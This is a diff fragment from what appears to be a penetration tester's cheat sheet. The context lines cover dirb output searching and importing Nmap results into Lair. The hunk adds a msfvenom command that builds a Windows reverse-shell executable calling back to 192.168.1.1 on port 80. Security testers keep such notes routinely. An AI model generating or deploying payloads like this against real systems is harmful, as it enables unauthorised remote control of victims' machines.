@@ -382,3 +382,5 @@ egrep -ir 'found' */dirb*
 #### Import Nmap scans to lair
 ./drone-nmap_darwin_amd64 5T9mjLQEp32g8BXCH /Path/nmap.xml
 
+# ----- msfvenom ----- #
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT 80 -f exe > /tmp/file.exe
